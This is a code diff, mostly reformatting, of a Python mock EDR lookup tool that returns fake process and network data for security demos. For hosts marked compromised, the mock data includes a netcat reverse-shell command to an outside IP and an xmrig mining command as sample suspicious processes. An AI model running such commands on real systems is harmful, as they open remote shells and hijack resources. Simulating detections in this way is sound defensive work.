@@ -4,6 +4,7 @@ Mocks a CrowdStrike/SentinelOne-style EDR lookup: running processes, recent
 network connections, IOCs (file hashes), lateral movement signals.
 Returns scenario-aware mock data keyed on hostname so demos are deterministic.
 """
+
 from __future__ import annotations
 
 import hashlib
@@ -35,7 +36,9 @@ def _seed(hostname: str) -> int:
         "required": ["hostname"],
     },
 )
-async def query_edr_endpoint(hostname: str, hours_back: int = 1, include_alerts: bool = True) -> dict:
+async def query_edr_endpoint(
+    hostname: str, hours_back: int = 1, include_alerts: bool = True
+) -> dict:
     if settings.use_mock_tools:
         return _mock(hostname, hours_back, include_alerts)
     # Real path stub — production would call CrowdStrike Falcon API here.
@@ -46,9 +49,7 @@ def _mock(hostname: str, hours_back: int, include_alerts: bool) -> dict:
     seed = _seed(hostname)
     rng = random.Random(seed)
     now = datetime.now(timezone.utc)
-    is_compromised = (
-        "bastion" not in hostname.lower() and seed % 3 == 0
-    ) or any(
+    is_compromised = ("bastion" not in hostname.lower() and seed % 3 == 0) or any(
         t in hostname.lower() for t in ("prod-app-03", "k8s-worker-7", "prod-db-02")
     )
 
@@ -60,13 +61,27 @@ def _mock(hostname: str, hours_back: int, include_alerts: bool) -> dict:
 
     if is_compromised:
         processes += [
-            {"pid": 4888, "name": "xmrig", "user": "nobody", "command_line": "./xmrig --url pool.minexmr.com:4444", "suspicious": True},
-            {"pid": 5102, "name": "nc", "user": "nobody", "command_line": "nc -e /bin/bash 45.142.120.99 9001", "suspicious": True},
+            {
+                "pid": 4888,
+                "name": "xmrig",
+                "user": "nobody",
+                "command_line": "./xmrig --url pool.minexmr.com:4444",
+                "suspicious": True,
+            },
+            {
+                "pid": 5102,
+                "name": "nc",
+                "user": "nobody",
+                "command_line": "nc -e /bin/bash 45.142.120.99 9001",
+                "suspicious": True,
+            },
         ]
         for _ in range(4):
             connections.append(
                 {
-                    "timestamp": (now - timedelta(minutes=rng.randint(0, hours_back * 60))).isoformat(),
+                    "timestamp": (
+                        now - timedelta(minutes=rng.randint(0, hours_back * 60))
+                    ).isoformat(),
                     "local_port": rng.randint(40000, 60000),
                     "remote_ip": rng.choice(["45.142.120.99", "193.32.162.144", "203.0.113.42"]),
                     "remote_port": rng.choice([4444, 9001, 8080]),
